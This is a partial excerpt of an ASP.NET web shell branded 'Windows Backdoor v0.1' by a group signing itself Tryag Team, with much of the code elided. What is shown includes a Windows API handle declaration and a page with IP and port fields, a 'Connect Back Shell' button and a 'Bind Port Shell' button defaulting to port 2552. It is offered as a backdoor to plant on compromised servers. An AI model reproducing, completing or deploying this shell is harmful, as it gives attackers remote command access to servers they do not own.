...
<script runat="server">
//--------------------------------------------------------
// Developed By b0x  | Tryag TeaM
// Tryag.cc
// Greet'z 2 So9oR | The Inject0r | Dr AnGeL | √»Ê Õ„“…
//--------------------------------------------------------
   ...
   static extern bool DuplicateHandle(IntPtr hSourceProcessHandle,
    ...
    protected void txtRemoteHost_TextChanged(object sender, EventArgs e)
    {
...
<head id="Head1" runat="server">
    <title>[#] Windows Backdoor v0.1 !</title>
	<meta name="description" content="Developed by b0x | Tryag TeaM">
</head>
<body link="#FF0000" vlink="#FF0000" alink="#FF0000" text="#FF0000" bgcolor="#000000">
    ...
    <br />
    <br />
        <span style="font-size: 24pt; font-family: Tahoma"><strong>Windows Backdoor v0.1<br />
        &nbsp;</strong></span><br />
        <br />
        <asp:Label ID="Label2" runat="server" Text="IP" Width="198px" Font-Names="Tahoma"></asp:Label><span
            style="font-family: Tahoma"> </span>
        <asp:Label ID="Label3" runat="server" Text="Port" Width="101px" Font-Names="Tahoma"></asp:Label><br />
        <asp:TextBox ID="txtRemoteHost" runat="server" Width="191px" OnTextChanged="txtRemoteHost_TextChanged" BorderColor="Red"></asp:TextBox><span
            style="font-family: Tahoma"> </span>
        <asp:TextBox ID="txtRemotePort" runat="server" Width="94px" BorderColor="Red"></asp:TextBox><br />
        <asp:Button ID="butConnectBack" runat="server" OnClick="butConnectBack_Click" Text="Connect Back Shell"
            Width="302px" BorderColor="Red" /><br />
        <br />
        <br />
        <br />
        <asp:Label ID="Port" runat="server" Text="Port" Width="189px" Font-Bold="False" Font-Names="Tahoma"></asp:Label><br />
        <asp:TextBox ID="txtBindPort" runat="server" Width="91px" BorderColor="Red">2552</asp:TextBox><br />
        <asp:Button ID="butBindPort" runat="server" OnClick="butBindPort_Click" Text="Bind Port Shell"
            Width="299px" BorderColor="Red" /><br />
        <br />
        <span style="font-size: 9pt; font-family: Verdana">
            <br />
            <br />
            <a href="http://www.tryag.cc"><strong>
        Developed By Tryag Team | b0x</strong></a></span></div>
    </form>
</body>
</html>